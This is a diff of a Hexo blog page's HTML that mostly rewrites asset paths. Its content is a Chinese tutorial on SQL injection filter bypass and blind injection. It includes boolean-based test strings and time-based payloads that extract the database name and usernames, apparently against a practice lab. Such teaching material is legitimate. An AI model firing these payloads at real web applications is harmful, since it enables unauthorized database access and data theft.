@@ -10,21 +10,21 @@
     </title>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
-    <link rel="stylesheet" href="/hexo/css/mic_main.css" />
-    <link rel="stylesheet" href="/hexo/css/dropdownMenu.css" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
     <meta name="keywords" content="NYQX" />
     
     	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 	 
     <noscript>
-        <link rel="stylesheet" href="/hexo/css/noscript.css" />
+        <link rel="stylesheet" href="/css/noscript.css" />
     </noscript>
     <style type="text/css">
         body:before {
           content: ' ';
           position: fixed;
           top: 0;
-          background: url('/hexo/img/bg.jpg') center 0 no-repeat;
+          background: url('/img/bg.jpg') center 0 no-repeat;
           right: 0;
           bottom: 0;
           left: 0;
@@ -56,12 +56,12 @@
   
 
 
-    <script src="/hexo/js/jquery.min.js"></script>
-    <script src="/hexo/js/jquery.scrollex.min.js"></script>
-    <script src="/hexo/js/jquery.scrolly.min.js"></script>
-    <script src="/hexo/js/skel.min.js"></script>
-    <script src="/hexo/js/util.js"></script>
-    <script src="/hexo/js/main.js"></script>
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
 	
 </head>
     
@@ -81,14 +81,14 @@
         <!-- Intro 头部显示 e -->
         <!-- Header 头部logo start -->
         <header id="header">
-    <a href="/hexo/" class="logo">Ting</a>
+    <a href="/" class="logo">Ting</a>
 </header>
         <!-- Nav 导航条 start -->
         <nav id="nav" class="special" >
             <ul class="menu links" >
 			<!-- Homepage  主页  --> 
 			<li >
-	            <a href="/hexo/" rel="nofollow">主页</a>
+	            <a href="/" rel="nofollow">主页</a>
 	        </li>
 			<!-- categories_name  分类   --> 
 	        
@@ -144,7 +144,7 @@
             </div>
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/2018/07/06/SQL2/1.jpg" alt="1"><br>&emsp;&emsp;表面坚强，内心凉凉。<br>&emsp;&emsp;若要年华不负，唯有勇敢以付。  </p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/hexo/2018/07/06/SQL2/1.jpg" alt="1"><br>&emsp;&emsp;表面坚强，内心凉凉。<br>&emsp;&emsp;若要年华不负，唯有勇敢以付。  </p>
 <hr>
 <p><br></p>
 <h3 id="1、过滤绕过"><a href="#1、过滤绕过" class="headerlink" title="1、过滤绕过"></a>1、过滤绕过</h3><h4 id="0-、小前言"><a href="#0-、小前言" class="headerlink" title="(0)、小前言"></a>(0)、小前言</h4><p>&emsp;&emsp;SQL注入的过程中有些特定的字符或者字符串会被过滤，数据库无法真正读入查询语句，<br>因此我们需要绕过这些过滤。</p>
@@ -185,7 +185,7 @@
 <p><em>例:</em><br>语句1：select * from student limit 9,4<br>语句2：slect * from student limit 4 offset 9<br>//语句1和2均返回表student的第10、11、12、13行<br>//语句2中的4表示返回4行，9表示从表的第十行开始</p>
 </blockquote>
 <h4 id="1-、布尔型盲注"><a href="#1-、布尔型盲注" class="headerlink" title="(1)、布尔型盲注"></a>(1)、布尔型盲注</h4><p>&emsp;&emsp;只有false和true两种状态，过程中需要猜测，直到猜到正确型为止。</p>
-<h5 id="布尔型盲注步骤"><a href="#布尔型盲注步骤" class="headerlink" title="布尔型盲注步骤"></a>布尔型盲注步骤</h5><h6 id="判断是否有盲注点"><a href="#判断是否有盲注点" class="headerlink" title="判断是否有盲注点"></a><1>判断是否有盲注点</1></h6><p>&emsp;&emsp;只要当SQL语句执行成功和失败的返回的页面存在某种<strong>固定差异</strong>，即存在布尔型盲注点。<br>输入1’ and ‘1’ = ‘1，返回true;<br>输入1’ and ‘1’ = ‘2，返回false，并且没有返回。<br>如图：<br><img src="/2018/07/06/SQL2/2.jpg" alt="2"><br><img src="/2018/07/06/SQL2/3.jpg" alt="2"></p>
+<h5 id="布尔型盲注步骤"><a href="#布尔型盲注步骤" class="headerlink" title="布尔型盲注步骤"></a>布尔型盲注步骤</h5><h6 id="判断是否有盲注点"><a href="#判断是否有盲注点" class="headerlink" title="判断是否有盲注点"></a><1>判断是否有盲注点</1></h6><p>&emsp;&emsp;只要当SQL语句执行成功和失败的返回的页面存在某种<strong>固定差异</strong>，即存在布尔型盲注点。<br>输入1’ and ‘1’ = ‘1，返回true;<br>输入1’ and ‘1’ = ‘2，返回false，并且没有返回。<br>如图：<br><img src="/hexo/2018/07/06/SQL2/2.jpg" alt="2"><br><img src="/hexo/2018/07/06/SQL2/3.jpg" alt="2"></p>
 <h6 id="利用函数来搜集信息"><a href="#利用函数来搜集信息" class="headerlink" title="利用函数来搜集信息"></a><2>利用函数来搜集信息</2></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos; and substring(user(),1,1) =&apos;r&apos; --+</span><br><span class="line">#截取第一位开始的一个</span><br></pre></td></tr></table></figure>
 <p>全句：select 2列 from 表 where name = ‘1’  and substring(user(),1,1) =’r’ –+’</p>
 <h6 id="猜解库，表，列，内容"><a href="#猜解库，表，列，内容" class="headerlink" title="猜解库，表，列，内容"></a><3>猜解库，表，列，内容</3></h6><p>&emsp;&emsp;用字典文件替换db,table,column,如果不存在，返回false界面；存在，返回true界面。<br>(1)猜解当前数据库的名字<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$name=1&apos; and ascii(mid(database(),1,1))&gt;115--+’</span><br></pre></td></tr></table></figure></p>
@@ -202,7 +202,7 @@
 <p>(4)猜解列名对应的内容<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$name=1&apos; and if(ascii(substr((select username from security.users order by id 	limit 0,1),1,1))=68,1,sleep(5))--+</span><br></pre></td></tr></table></figure></p>
 <hr>
 <p><br></p>
-<h3 id="吾王镇楼！"><a href="#吾王镇楼！" class="headerlink" title="吾王镇楼！"></a>吾王镇楼！</h3><p><img src="/2018/07/06/SQL2/w.jpg" alt="saber"></p>
+<h3 id="吾王镇楼！"><a href="#吾王镇楼！" class="headerlink" title="吾王镇楼！"></a>吾王镇楼！</h3><p><img src="/hexo/2018/07/06/SQL2/w.jpg" alt="saber"></p>
 
             </div>
 
